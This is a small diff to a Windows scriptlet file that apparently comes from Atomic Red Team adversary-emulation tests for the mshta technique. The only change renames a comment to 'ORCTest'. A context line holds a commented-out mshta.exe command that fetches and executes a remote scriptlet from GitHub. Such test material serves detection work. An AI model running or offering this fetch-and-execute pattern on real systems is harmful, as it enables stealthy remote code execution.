@@ -1,6 +1,6 @@
 <?xml version="1.0"?>
 <scriptlet>
-  <!-- Test -->
+  <!-- ORCTest -->
   <!-- mshta.exe javascript:a=(GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct")).Exec();close(); -->
 
 <registration
